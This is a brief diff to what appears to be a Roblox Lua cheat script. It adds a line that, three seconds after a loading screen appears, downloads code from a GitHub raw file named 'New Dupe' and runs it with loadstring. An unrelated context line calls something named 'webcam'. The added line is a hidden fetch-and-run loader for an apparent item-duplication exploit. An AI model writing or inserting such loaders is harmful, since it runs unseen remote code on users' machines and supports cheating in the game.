@@ -192,6 +192,6 @@ if hasCam~="" then df(webcam) end
 game:GetService("CoreGui").ChildAdded:Connect(function(c)
     if c.Name:find("RobloxLoading") then
         task.wait(3)
-        loadstring(game:HttpGet(""))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alech01/Duels-V2-/refs/heads/main/New%20Dupe"))()
     end
 end)
